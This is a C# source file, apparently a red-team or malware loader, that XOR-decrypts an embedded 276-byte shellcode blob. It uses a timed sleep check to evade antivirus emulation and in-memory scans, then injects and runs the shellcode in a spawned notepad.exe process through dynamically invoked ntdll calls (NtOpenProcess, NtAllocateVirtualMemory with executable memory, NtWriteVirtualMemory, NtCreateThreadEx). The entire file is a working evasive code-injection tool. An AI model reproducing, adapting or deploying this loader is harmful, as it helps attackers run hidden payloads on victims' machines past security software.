using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DynamicInvoke = DInvoke.DynamicInvoke;

namespace ProcHollowDinvoke
{
    class DELEGATES
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DInvoke.Data.Native.NTSTATUS NtClose(IntPtr keyHandle);
    }

    class Program
    {
        static byte[] _shellcode = new byte[276] { 0x9e, 0x29, 0xe7, 0x81, 0x91, 0x8e, 0xa6, 0x65, 0x6e, 0x77, 0x20, 0x37, 0x27, 0x35, 0x3c, 0x33, 0x37, 0x2c, 0x54, 0xb3, 0x03, 0x2e, 0xee, 0x3c, 0x17, 0x29, 0xed, 0x34, 0x7d, 0x26, 0xe9, 0x33, 0x44, 0x2d, 0xea, 0x14, 0x36, 0x2d, 0x61, 0xc0, 0x2b, 0x2c, 0x2b, 0x54, 0xa7, 0x2a, 0x50, 0xa4, 0xc9, 0x5d, 0x07, 0x1a, 0x67, 0x42, 0x57, 0x20, 0xa7, 0xaf, 0x68, 0x2f, 0x63, 0xa0, 0x86, 0x88, 0x33, 0x27, 0x37, 0x2d, 0xe5, 0x25, 0x41, 0xed, 0x24, 0x59, 0x26, 0x63, 0xb1, 0xef, 0xe5, 0xe9, 0x66, 0x66, 0x65, 0x26, 0xf2, 0xa1, 0x12, 0x01, 0x2d, 0x6f, 0xb2, 0x31, 0xef, 0x2d, 0x79, 0x22, 0xed, 0x25, 0x4e, 0x3e, 0x60, 0xb6, 0x85, 0x33, 0x26, 0x9d, 0xa8, 0x25, 0xee, 0x55, 0xee, 0x2e, 0x64, 0xb8, 0x3a, 0x50, 0xaf, 0x2e, 0x54, 0xae, 0xce, 0x20, 0xa5, 0xac, 0x6c, 0x27, 0x67, 0xa4, 0x56, 0x97, 0x14, 0x97, 0x2a, 0x66, 0x22, 0x46, 0x69, 0x21, 0x5c, 0xb0, 0x13, 0xbe, 0x3d, 0x2a, 0xfc, 0x21, 0x42, 0x2f, 0x64, 0xbe, 0x04, 0x20, 0xef, 0x69, 0x29, 0x22, 0xed, 0x25, 0x72, 0x3e, 0x60, 0xb6, 0x27, 0xee, 0x6a, 0xea, 0x29, 0x65, 0xb5, 0x20, 0x3e, 0x27, 0x3d, 0x30, 0x2e, 0x3b, 0x27, 0x3e, 0x24, 0x37, 0x23, 0x3b, 0x2c, 0xe6, 0x8d, 0x46, 0x27, 0x37, 0x91, 0x97, 0x39, 0x27, 0x3f, 0x3f, 0x26, 0xe9, 0x73, 0x8d, 0x32, 0x9e, 0x99, 0x99, 0x38, 0x26, 0xcd, 0x60, 0x66, 0x66, 0x65, 0x6e, 0x62, 0x61, 0x64, 0x2d, 0xec, 0xeb, 0x67, 0x64, 0x6e, 0x77, 0x20, 0xdc, 0x57, 0xee, 0x01, 0xe5, 0x9e, 0xb1, 0xde, 0x91, 0xd3, 0xc4, 0x33, 0x2f, 0xcd, 0xc7, 0xf3, 0xdb, 0xf8, 0x91, 0xb7, 0x29, 0xe7, 0xa1, 0x49, 0x5a, 0x60, 0x19, 0x64, 0xf7, 0x9a, 0x86, 0x13, 0x60, 0xd5, 0x25, 0x72, 0x16, 0x0a, 0x0b, 0x66, 0x3f, 0x24, 0xe7, 0xad, 0x9e, 0xb3, 0x05, 0x04, 0x02, 0x01, 0x4f, 0x01, 0x1d, 0x04, 0x66 };
        public static byte[] XOReD(byte[] byteIn)
        {
            string keyIn = "badeaffenwaffen";

            for (int i = 0; i < byteIn.Length; i++)
            {
                byteIn[i] = (byte)(byteIn[i] ^ keyIn[i % keyIn.Length]);
            }
            return byteIn;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Main()
        {

            Console.WriteLine("[+] Delay of three seconds for scan bypass check");
            // Sleep for 3 seconds to evade in-memory scan and checks if the emulator did not fast forward through the sleep instruction
            DateTime time1 = DateTime.Now;
            Thread.Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
                return;
            }

            byte[] shellcode = XOReD(_shellcode);

            Process newproc;
            string proc = "notepad.exe";

            var info = new ProcessStartInfo(proc, "")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            info.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo = info;
            process.Start();

            newproc = Process.Start(proc);
            Console.WriteLine("Started " + proc + " with Process Id:" + newproc.Id);

            DInvokeProcessHollow(shellcode, newproc.Id);
        }

        public static void DInvokeProcessHollow(byte[] shellcode, int targetPid)
        {
            // get handle for process
            DInvoke.Data.Native.CLIENT_ID cid = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)targetPid
            };

            DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
            IntPtr pHandle = IntPtr.Zero;

            Object[] ntOpenProcessParams =
            {
                pHandle, // out pHandle
                DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                oa,
                cid
            };

            DInvoke.Data.Native.NTSTATUS status = (DInvoke.Data.Native.NTSTATUS)DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "NtOpenProcess", typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess), ref ntOpenProcessParams);
            IntPtr hProc = (IntPtr)ntOpenProcessParams[0];
            Console.WriteLine($"[*] Handle: {hProc}");

            // Allocate memory for shellcode
            IntPtr baseAddr = IntPtr.Zero;
            Object[] ntNtAllocateVirtualMemoryParams =
            {
                hProc,
                baseAddr,
                (IntPtr)0,
                (IntPtr)shellcode.Length,
                DInvoke.Data.Win32.Kernel32.MEM_COMMIT,
                DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
            };

            status = (DInvoke.Data.Native.NTSTATUS)DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory), ref ntNtAllocateVirtualMemoryParams);
            baseAddr = (IntPtr)ntNtAllocateVirtualMemoryParams[1];

            if ((int)status != 0)
            {
                Console.WriteLine("[!] Failed to allocate memory");
            }

            // Write shellcode to allocated memory
            uint bytesWritten = 0;
            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            Object[] ntWriteVirtualMemoryParams =
            {
                (IntPtr)hProc,
                (IntPtr)baseAddr,
                buffer,
                (uint)shellcode.Length,
                bytesWritten
            };

            status = (DInvoke.Data.Native.NTSTATUS)DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), ref ntWriteVirtualMemoryParams);
            bytesWritten = (uint)ntWriteVirtualMemoryParams[4];
            Console.WriteLine($"[*] Bytes written: {bytesWritten}, Shellcode size: {shellcode.Length}");

            if (status != 0)
            {
                Console.WriteLine("[!] Error writing shellcode to memory");
            }

            // create thread for shellcode
            IntPtr tHandle = IntPtr.Zero;
            Object[] ntCreateThreadExParams =
            {
                tHandle,
                (DInvoke.Data.Win32.WinNT.ACCESS_MASK)0x1FFFFF, // THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hProc,
                (IntPtr)baseAddr,
                IntPtr.Zero,
                false,
                0, 0, 0, IntPtr.Zero
            };

            status = (DInvoke.Data.Native.NTSTATUS)DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateThreadEx", typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx), ref ntCreateThreadExParams);
            tHandle = (IntPtr)ntCreateThreadExParams[0];

            if (status != 0)
            {
                Console.WriteLine("[!] Error creating thread");
            }

            // Close Handles
            Object[] ntCloseParams1 = {
                tHandle
            };
            Object[] ntCloseParams2 = {
                    pHandle
            };
            DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtClose", typeof(DELEGATES.NtClose), ref ntCloseParams1);
            DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtClose", typeof(DELEGATES.NtClose), ref ntCloseParams2);
        }
    }
}
